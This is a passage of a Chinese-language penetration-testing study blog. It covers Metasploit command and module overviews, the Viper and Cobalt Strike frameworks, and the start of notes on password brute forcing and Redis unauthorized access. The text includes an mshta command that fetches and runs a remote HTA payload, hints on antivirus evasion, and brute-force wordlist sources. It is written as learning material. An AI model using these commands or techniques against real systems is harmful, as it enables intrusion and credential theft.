设置&#x2F;禁用适用于所有模块的全局参数</p></blockquote><h4 id="数据库管理命令"><a href="#数据库管理命令" class="headerlink" title="数据库管理命令"></a>数据库管理命令</h4><blockquote><p>msfdb init                <strong>#</strong> 启动并初始化数据库</p><p>msfdb reinit             <strong>#</strong> 删除并重新初始化数据库</p><p>msfdb <strong>delete</strong>          #** 删除并停止使用数据库</p><p>msfdb start             <strong>#</strong> 启动数据库</p><p>msfdb <strong>stop</strong>             <strong>#</strong> 停止数据库</p><p>msfdb status           <strong>#</strong> 检查服务状态</p><p><strong>msfdb run</strong>               <strong>#</strong> 启动数据库并运行<strong>msfconsole</strong></p></blockquote><h4 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h4><blockquote><p>?             帮助菜单<br>banner        显示  Metasploit banner信息<br><strong>cd</strong>            更改当前工作目录<br>color         切换颜色<br>connect       与主机通信<br><strong>debug</strong>         显示对调试有用的信息<br><strong>exit</strong>          退出控制台<br>features      显示可以选择加入的尚未发布的功能列表<br><strong>get</strong>           获取特定变量的值<br>getg          获取全局变量的值<br><strong>grep</strong>          筛选以一条命令的输出<br><strong>help</strong>          帮助菜单<br><strong>history</strong>       显示命令历史记录<br>load          加载框架插件<br><strong>quit</strong>          退出控制台<br><strong>repeat</strong>        重复一个命令列表<br>route         通过一个session会话路由流量<br>save          保存活动的数据存储<br>sessions      导出会话列表并显示会话信息<br><strong>set</strong>           将一个特定环境的变量设置为一个值<br><strong>setg</strong>          将一个全局变量设置为一个值<br><strong>sleep</strong>         在指定的秒数内不执行任何操作<br>spool         将控制台输出写入文件以及屏幕<br>threads       查看和操作后台线程<br>tips          显示有用的提示清单<br>unload        卸载框架插件<br>unset         取消设置的一个或多个变量<br>unsetg        取消设置一个或多个全局变量<br><strong>version</strong>       显示框架和控制台库版本号</p></blockquote><h4 id="模块命令"><a href="#模块命令" class="headerlink" title="模块命令"></a>模块命令</h4><blockquote><p>advanced      显示一个或多个模块的高级选项<br>back          从当前环境返回<br>clearm        清除模块堆栈<br>favorite      将模块添加到最喜欢的模块列表中<br><strong>info</strong>          显示一个或多个模块的详细信息<br>listm         列表中的模块栈<br>loadpath      从路径中搜索并加载模块<br><strong>options</strong>       显示一个或多个模块全局选项<br>popm          将最新的模块从堆栈中弹出并使其处于活动状态<br>previous      将之前加载的模块设置为当前模块 pushm         将活动模块或模块列表推送到模块堆栈 reload_all    重新加载所有模块<br><strong>search</strong>        搜索模块名称和描述<br><strong>show</strong>          显示给定类型的的模块或所有模块<br>use           通过名称或搜索词&#x2F;索引选择使用模块</p></blockquote><h4 id="作业命令"><a href="#作业命令" class="headerlink" title="作业命令"></a>作业命令</h4><blockquote><p>handler       启动一个payload处理程序作为job </p><p>jobs          显示和管理  jobs</p><p>kill          杀掉一个job </p><p>rename_job    重命名一个job</p></blockquote><h4 id="开发者命令"><a href="#开发者命令" class="headerlink" title="开发者命令"></a>开发者命令</h4><blockquote><p>edit          用首选编辑器编辑当前模块或文件<br>irb           在当前环境下打开一个交互式Ruby shell<br>log           如果可能的话，将framework.log分页显示到最后。<br>pry           在当前模块或框架上打开  Pry 调试器<br>reload_lib    从指定路径重新加载Ruby库文件<br>time          运行一个特定命令所需的时间</p></blockquote><h4 id="攻击载荷命令"><a href="#攻击载荷命令" class="headerlink" title="攻击载荷命令"></a>攻击载荷命令</h4><blockquote><p>check         检查一个目标是否易受攻击<br>generate      生成一个有效载荷<br>reload        从磁盘重新加载当前的模块<br>to_handler    用指定的有效载荷创建一个处理程序</p></blockquote><h3 id="MSF模块简绍"><a href="#MSF模块简绍" class="headerlink" title="MSF模块简绍"></a>MSF模块简绍</h3><blockquote><p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。MSF所有的漏洞测试都是基于模块。</p></blockquote><p>一共有以下7种模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901143836927.png" alt="image-20230901143836927"></p><ol><li><p>辅助模块（<strong>Auxiliary</strong>）</p><p>例如针对各种网络服务的<strong>扫描与查点</strong>、<strong>网络扫描</strong>、<strong>枚举</strong>、<strong>漏洞扫描</strong>、<strong>登录口令暴力破解</strong>、<strong>模糊测试</strong>、<strong>爬虫遍历</strong>、<strong>数据提取</strong>等</p><p>此外，辅助模块中还包括一些<strong>无须加</strong>载攻击载荷，同时往往不是取得目标系统远程控制权的渗透攻击，例如：拒绝服务攻击。</p></li><li><p>渗透攻击模块（<strong>Exploits</strong>）</p><p>就是用于攻击的模块</p><p>有远程漏洞利用、本地漏洞利用、权限提升漏洞利用、客户端漏洞利用、Web 应用程序漏洞利用和许多其他漏洞。</p></li><li><p>攻击载荷模块（<strong>Payloads</strong>）</p><p>用于在利用期间执行操作的模块。攻击载荷是在渗透攻击成功后在目标系统运行的一段植入代码，通常是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成ShellCode中实现的单一功能。</p><p>例如<strong>建立 Meterpreter 会话、反向 shell、执行命令、下载和执行程序</strong>等。</p></li><li><p>后渗透攻击模块（<strong>Post</strong>）</p><p>用于在拿到权限后进行后渗透利用操作的模块，例如凭证&#x2F;哈希转储、本地权限提升、后门安装、敏感数据提取、网络流量隧道（代理）、键盘记录、屏幕捕获和许多其他操作。</p></li><li><p>空指令模块(<strong>Nops</strong>)</p><p>用于生成无害、良性的“无操作”指令的模块，例如用于填充目的、在利用期间在内存中滑动等。用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，从而提高渗透攻击的可靠性。</p><p>可以理解为这个是提高成功的保险</p></li><li><p>编码模块(<strong>Encoders</strong>)</p><p>用于有效负载编码和加密的模块，例如 base64、XOR、shikata_ga_nai 等。这有助于混淆以规避防病毒或 NIDS（网络入侵检测系统）、EDR（端点检测和响应）等防御。</p></li><li><p>规避模块(<strong>Evasions</strong>)</p><p>用于规避防御的模块，例如防病毒规避、AppLocker 绕过、软件限制策略 (SRP) 绕过等。</p><blockquote><p>搜索MSF常见的模块以及详细的使用方法</p><p><a href="https://www.infosecmatter.com/metasploit-module-library/">https://www.infosecmatter.com/metasploit-module-library/</a></p></blockquote></li></ol><h3 id="MSF辅助扫描"><a href="#MSF辅助扫描" class="headerlink" title="MSF辅助扫描"></a>MSF辅助扫描</h3><ol><li><p>MSF主机发现</p><p>模块发现</p><blockquote><p>modules&#x2F;auxiliary&#x2F;scanner&#x2F;discovery&#x2F;</p></blockquote><p>也可以通过search进行搜索模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901151108175.png" alt="image-20230901151108175"></p><p>arp_sweep：使用arp请求枚举本地局域网中的所有活跃主机</p><p>udp_sweep：通过发送UDP数据包探查指定主机是否活跃，并发现主机上的udp服务。</p><p>模块使用</p><ul><li><p>arp_sweep模块使用</p><blockquote><p>use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep</p><p>set RHOSTS 10.10.10.0&#x2F;24</p><p>set THREADS 50</p><p>run</p></blockquote><p>设置好过后，代表进行启动</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901183217283.png" alt="image-20230901183217283"></p></li></ul></li></ol><h3 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h3><ol><li><p>生成payload 查看指定的参数</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--list-options</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127102743048.png" alt="image-20240127102743048"></p></li><li><p>查看payload</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">msfvenom -l payloads <span class="hljs-string">| grep windows</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127103050414.png" alt="image-20240127103050414"></p></li></ol><h3 id="相关模块简绍"><a href="#相关模块简绍" class="headerlink" title="相关模块简绍"></a>相关模块简绍</h3><p>介绍一些使用率没有那么高，但是挺重要的模块</p><ol><li><p>web_delivery</p><p>该模块没有文件落地</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127103225617.png" alt="image-20240127103225617"></p><p>查看高级设置</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> advanced<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127103343707.png" alt="image-20240127103343707"></p><p>查看target</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127103948853.png" alt="image-20240127103948853"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127104108590.png" alt="image-20240127104108590"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127104123285.png" alt="image-20240127104123285"></p></li></ol><h2 id="Viper渗透框架"><a href="#Viper渗透框架" class="headerlink" title="Viper渗透框架"></a>Viper渗透框架</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化。  集成杀软绕过，内网隧道,文件管理，命令行等基础功能。  当前已集成70+个模块，覆盖初始访问&#x2F;持久化&#x2F;权限提升&#x2F;防御绕过&#x2F;凭证访问&#x2F;信息收集&#x2F;横向移动等  大类。  目标是帮助红队工程师提高攻击效率，简化操作，降低技术门槛。支持在浏览器中运行原生 msfconsole，且支持多人协作</p></blockquote><blockquote><p>文档：<a href="https://www.yuque.com/vipersec">https://www.yuque.com/vipersec</a>  </p><p>github：<a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a>  </p></blockquote><p>多看看，文档</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在输入密码之后进入到这个应用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127112448026.png" alt="image-20240127112448026"></p><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>建议生成完监听器之后直接生成payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127113945128.png" alt="image-20240127113945128"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127112544746.png" alt="image-20240127112544746"></p><p>不支持免杀</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240127113748752.png" alt="image-20240127113748752"></p><h2 id="CobaltStrike渗透框架"><a href="#CobaltStrike渗透框架" class="headerlink" title="CobaltStrike渗透框架"></a>CobaltStrike渗透框架</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这个是基于matasploit二次开发的框架</p><p>Cobalt Strike（简称为CS）是一款团队作战渗透神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户端连接。</p><p>默认只能针对windows，相对于msf改进了很多东西，同时也不会被发现因为cs采用http的形式，默认每60s通信一次。对于检测流量来说，可以是很隐蔽的了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128095708861.png" alt="image-20240128095708861"></p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p><a href="https://study.yijinglab.com/mw/289192ed7899c0dbc3f8e19e1d6084f4/class/download-file/temp-url/bcdf0075-a37c-4cd1-b9e0-a5427a514e54?_=%22BAE3A23BBBCB7032A4B9A5C0327D06EB-14%22&filePath=22-CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/cs4.7-cn.zip">下载链接</a></p><p>这个是中文版</p><h4 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h4><ol><li><p>进入到文件夹过后，进行一下的操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902151141018.png" alt="image-20230902151141018"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902151153763.png" alt="image-20230902151153763"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902151825591.png" alt="image-20230902151825591"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ./teamserver 192.168.13.114 0804chgCHG<br>IP  密码<br></code></pre></td></tr></table></figure></li></ol><h4 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152315988.png" alt="image-20230902152315988"></p><h5 id="win"><a href="#win" class="headerlink" title="win"></a>win</h5><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152002463.png" alt="image-20230902152002463"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152024051.png" alt="image-20230902152024051"></p><p>完成基本的配置，注意主机是服务端的地址，用户的名称不能重复</p><h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><p>linux必须是在有图形界面的才能正常的运行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152238766.png" alt="image-20230902152238766"></p><p>这里需要等一下</p><h4 id="英文版的翻译"><a href="#英文版的翻译" class="headerlink" title="英文版的翻译"></a>英文版的翻译</h4><p>下面 是旧版的cs，我们使用的是新版的cs</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152348898.png" alt="image-20230902152348898"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152439650.png" alt="image-20230902152439650"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152557225.png" alt="image-20230902152557225"></p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><p>简单介绍一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128094313064.png" alt="image-20240128094313064"></p><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><p>就可以替代使用python -m 开启监听</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128102745832.png" alt="image-20240128102745832"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128103032018.png" alt="image-20240128103032018"></p><p>托管了一个hta文件，现在尝试使用这个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mshta http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">7799</span><span class="hljs-regexp">/download/</span>file.ext <br></code></pre></td></tr></table></figure><p>然后被杀了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128103309818.png" alt="image-20240128103309818"></p><p>想免杀的话可以尝试使用C语言 或者raw格式的文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128103755897.png" alt="image-20240128103755897"></p><h3 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128105237494.png" alt="image-20240128105237494"></p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128105252160.png" alt="image-20240128105252160"></p><h2 id="cs插件简绍"><a href="#cs插件简绍" class="headerlink" title="cs插件简绍"></a>cs插件简绍</h2><h3 id="c2"><a href="#c2" class="headerlink" title="c2"></a>c2</h3><h4 id="生成linuxpayload"><a href="#生成linuxpayload" class="headerlink" title="生成linuxpayload"></a>生成linuxpayload</h4><ol><li><p>生成一个https的监听器</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240201091842806.png" alt="image-20240201091842806"></p></li><li><p>使用c2 创建一个监听器</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240201092008068.png" alt="image-20240201092008068"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240201091912769.png" alt="image-20240201091912769"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240201092036696.png" alt="image-20240201092036696"></p></li><li><p>查看payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240201092152456.png" alt="image-20240201092152456"></p></li></ol><h4 id="模拟上线"><a href="#模拟上线" class="headerlink" title="模拟上线"></a>模拟上线</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122600145.png" alt="image-20240219122600145"><br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122626209.png" alt="image-20240219122626209"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞攻击利用</title>
    <link href="/2023/08/26/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/"/>
    <url>/2023/08/26/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞攻击利用"><a href="#漏洞攻击利用" class="headerlink" title="漏洞攻击利用"></a>漏洞攻击利用</h1><h2 id="弱口令密码破解"><a href="#弱口令密码破解" class="headerlink" title="弱口令密码破解"></a>弱口令密码破解</h2><h3 id="常用的密码网站"><a href="#常用的密码网站" class="headerlink" title="常用的密码网站"></a>常用的密码网站</h3><blockquote><p><a href="https://forum.ywhack.com/password.php">https://forum.ywhack.com/password.php</a></p><p><a href="https://github.com/ibaiw/2023Hvv/blob/main/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81.md">https://github.com/ibaiw/2023Hvv/blob/main/默认密码.md</a> </p></blockquote><h3 id="弱密码破解方法"><a href="#弱密码破解方法" class="headerlink" title="弱密码破解方法"></a>弱密码破解方法</h3><ol><li><p>密码破解方法简绍</p><p>  指用枚举的方式来爆破用户信息。具体的流程是用事先收集好的数据集成一个字典，然后用字典不断  进行枚举，直到枚举成功  </p></li><li><p>暴力破解工具</p><p>  BurpSuite  （使用的反应，成功与否的大小反应不一样）</p><p>  Hydra  </p><p>  Metasploit  </p><p>SNETCracker：<a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p></li><li><p>暴力破解的字典</p><p>  <code>Default Password  </code></p><p>历年弱口令的top100，github上搜索弱口令字典</p><blockquote><p>  <a href="https://github.com/k8gege/PasswordDic">https://github.com/k8gege/PasswordDic</a>  </p><p>  <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>  </p><p>  <a href="https://192-168-1-1ip.mobi/default-router-passwords-list/">https://192-168-1-1ip.mobi/default-router-passwords-list/</a>  <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/def">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/def</a>  ault-passwords.csv  </p><p><a href="https://github.com/Dormidera/WordList-Compendium">https://github.com/Dormidera/WordList-Compendium</a></p></blockquote><p>创建自定义字典</p><p>参考网上的软件，下面拿出一个简绍</p><p>pydictor</p><p>  <a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p></li></ol><h3 id="暴力破解的场景"><a href="#暴力破解的场景" class="headerlink" title="暴力破解的场景"></a>暴力破解的场景</h3><ol><li><p>不含验证码的后台</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%BC%B1%E5%AF%86%E7%A0%81/image-20230826174924165-16930433646201.png" alt="image-20230826174924165"></p></li><li><p>不失效的验证码</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%BC%B1%E5%AF%86%E7%A0%81/image-20230826175012568.png" alt="image-20230826175012568"></p><pre><code class="hljs"> 各种常见应用程序，比如：**phpmyadmin、tomcat、mysql**   各种协议：FTP、SSH、RDP等   爆破大马 </code></pre><h3 id="爆破方法"><a href="#爆破方法" class="headerlink" title="爆破方法"></a>爆破方法</h3><ol><li><p>BP抓包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%BC%B1%E5%AF%86%E7%A0%81/image-20230826175945632.png" alt="image-20230826175945632"></p></li></ol><h2 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h2><p>没有权限却可以访问</p><p>导致其他用户可以无需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露</p><h3 id="常见的未授权的漏洞"><a href="#常见的未授权的漏洞" class="headerlink" title="常见的未授权的漏洞"></a>常见的未授权的漏洞</h3><blockquote><p><strong>Redis</strong>  未授权访问漏洞  </p><p>Docker 未授权访问漏洞  </p><p>MongoDB 未授权访问漏洞  </p><p>Jenkins未授权访问漏洞  </p><p>Memcached 未授权访问漏洞  </p><p>JBOSS 未授权访问漏洞  </p><p>VNC 未授权访问漏洞  </p><p>ZooKeeper 未授权访问漏洞  </p><p>Rsync 未授权访问漏洞  </p><p>Atlassian Crowd 未授权访问漏洞  </p><p>CouchDB 未授权访问漏洞  </p><p>Elasticsearch 未授权访问漏洞  </p><p><strong>Hadoop</strong> 未授权访问漏洞  </p><p>Jupyter Notebook 未授权访问漏洞</p></blockquote><h3 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h3><ol><li><p>redis简介</p><p>  Redis 是完全开源免费的，一个灵活的高性能 key-value 数据结构存储，可以用来作为数据库、缓存  和消息队列。</p></li><li><p>redisd的框架</p><p>  Redis 主要由有两个程序组成：  </p><p>  Redis 客户端 redis-cli  </p><p>  Redis 服务器 redis-server  </p></li><li><p>应用场景</p><ul><li>存储 缓存数据</li><li>需要高速读写的场合使用它高速读写</li></ul></li><li><p>漏洞发现</p><p>redis默认监听端口是6379</p><blockquote><p>MongoDB：27017 </p><p>Memcached：11211  </p><p>Jboss：8080  </p><p>VNC：5900、5901  </p><p>Docker：2375  </p></blockquote></li><li><p>要确定对方是否开启redis服务，可以看是否开启了6379端口</p><p>但是使用者而可能更改了端口服务</p><ul><li><p>端口探测</p><blockquote><p>nmap -v -Pn -p 6379 -sV IP</p></blockquote><p><img 